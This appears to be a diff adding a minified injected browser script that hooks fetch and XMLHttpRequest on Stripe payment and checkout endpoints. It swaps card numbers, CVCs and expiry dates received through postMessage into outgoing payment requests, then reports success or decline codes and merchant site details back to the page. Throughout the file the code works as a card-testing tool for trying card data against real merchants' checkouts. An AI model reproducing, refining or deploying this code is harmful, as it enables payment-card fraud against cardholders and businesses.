@@ -1,0 +1,152 @@
+!(function () {
+  if (window.BINARY_INJECTED) return;
+  window.BINARY_INJECTED = !0;
+  let e = null,
+    t = null,
+    n = null,
+    s = !1;
+  const r = ["/v1/payment_methods", "/v1/sources"],
+    c = [
+      "/v1/payment_pages",
+      "/v1/payment_methods",
+      "/v1/sources",
+      "/v1/setup_intents",
+      "/v1/checkout/sessions",
+      "/completed_webhook_delivered",
+    ];
+  function o(e, t) {
+    if (!e) return;
+    if (t && t.includes("/v1/payment_pages"))
+      try {
+        if (e && e.account_settings) {
+          const t = {
+            business_url: e.account_settings.business_url || "Unknown",
+            success_url: e.success_url || "Unknown",
+            site_name: e.account_settings.display_name || "Unknown Site",
+          };
+          window.postMessage({ type: "BINARY_SITE_INFO", data: t }, "*");
+        }
+      } catch (e) {}
+    if (s) return;
+    if (t && t.includes("completed_webhook_delivered") && !0 === e.completed)
+      return ((s = !0), void a("Checkout Webhook Confirmed"));
+    if (
+      "checkout.session" === e.object &&
+      ("complete" === e.status ||
+        "succeeded" === e.state ||
+        "paid" === e.payment_status)
+    )
+      return ((s = !0), void a("Checkout Session Completed"));
+    if (
+      !(
+        ("succeeded" !== e.status && "active" !== e.status) ||
+        e.error ||
+        e.last_payment_error ||
+        e.last_setup_error
+      )
+    )
+      return ((s = !0), void a("Payment Intent Succeeded"));
+    let n = null;
+    (e.error
+      ? (n = e.error)
+      : e.payment_intent && e.payment_intent.last_payment_error
+        ? (n = e.payment_intent.last_payment_error)
+        : e.setup_intent && e.setup_intent.last_setup_error
+          ? (n = e.setup_intent.last_setup_error)
+          : e.last_payment_error
+            ? (n = e.last_payment_error)
+            : e.last_setup_error && (n = e.last_setup_error),
+      n &&
+        ((s = !0),
+        (function (e) {
+          const t = e.code || e.decline_code || "card_declined",
+            n = e.message || "Payment declined";
+          let s = "card_declined";
+          ("incorrect_number" === t && (s = "incorrect_number"),
+            "invalid_cvc" === t && (s = "invalid_cvc"),
+            window.postMessage(
+              { __stripe_helper: !0, type: s, decline_code: t, message: n },
+              "*",
+            ));
+        })(n)));
+  }
+  function a(e) {
+    window.postMessage(
+      { __stripe_helper: !0, type: "success", message: e },
+      "*",
+    );
+  }
+  window.addEventListener("message", (r) => {
+    if (r.source !== window) return;
+    const c = r.data;
+    c &&
+      "content_script" === c.source &&
+      "SET_CARD" === c.type &&
+      ((e = c.number), (t = c.date), (n = c.cvv), (s = !1));
+  });
+  const p = window.fetch;
+  window.fetch = function () {
+    const reqUrl = arguments[0],
+      a = arguments[1] || {};
+    if ("string" == typeof reqUrl && r.some((x) => reqUrl.includes(x)) && a.body && e && t && n)
+      try {
+        let body = a.body;
+        if (typeof body === "string") {
+          body = body
+            .replace(/("number":\s*")[^"]+(")/, `$1${e}$2`)
+            .replace(/(number=)[^&]+/, `number=${e}`)
+            .replace(/(card\[number\]=)[^&]+/, `card[number]=${e}`)
+            .replace(/("cvc":\s*")[^"]+(")/, `$1${n}$2`)
+            .replace(/(cvc=)[^&]+/, `cvc=${n}`)
+            .replace(/(card\[cvc\]=)[^&]+/, `card[cvc]=${n}`);
+          const [mm, yy] = t.split("/"), yyyy = "20" + yy;
+          body = body
+            .replace(/("exp_month":\s*")[^"]+(")/, `$1${mm}$2`)
+            .replace(/(exp_month=)[^&]+/, `exp_month=${mm}`)
+            .replace(/("exp_year":\s*")[^"]+(")/, `$1${yyyy}$2`)
+            .replace(/(exp_year=)[^&]+/, `exp_year=${yyyy}`);
+          a.body = body;
+        }
+      } catch (err) {}
+    return p.apply(this, arguments).then(
+      (e) => (
+        "string" == typeof reqUrl &&
+          c.some((u) => reqUrl.includes(u)) &&
+          e
+            .clone()
+            .json()
+            .then((e) => o(e, reqUrl))
+            .catch((e) => {}),
+        e
+      ),
+    );
+  };
+  const i = XMLHttpRequest.prototype.open,
+    u = XMLHttpRequest.prototype.send;
+  ((XMLHttpRequest.prototype.open = function (e, t) {
+    return ((this._url = t), i.apply(this, arguments));
+  }),
+    (XMLHttpRequest.prototype.send = function (body) {
+      if (this._url && r.some((e) => this._url.includes(e)) && typeof body === "string" && body && e && t && n)
+        try {
+          const [c, o] = t.split("/");
+          const newBody = body
+            .replace(/(number=)[^&]+/, `number=${e}`)
+            .replace(/(card\[number\]=)[^&]+/, `card[number]=${e}`)
+            .replace(/(cvc=)[^&]+/, `cvc=${n}`)
+            .replace(/(card\[cvc\]=)[^&]+/, `card[cvc]=${n}`)
+            .replace(/(exp_month=)[^&]+/, `exp_month=${c}`)
+            .replace(/(exp_year=)[^&]+/, `exp_year=20${o}`);
+          arguments[0] = newBody;
+        } catch (err) {}
+      return (
+        this.addEventListener("load", function () {
+          if (this._url && c.some((e) => this._url.includes(e)))
+            try {
+              o(JSON.parse(this.responseText), this._url);
+            } catch (e) {}
+        }),
+        u.apply(this, arguments)
+      );
+    }));
+})();
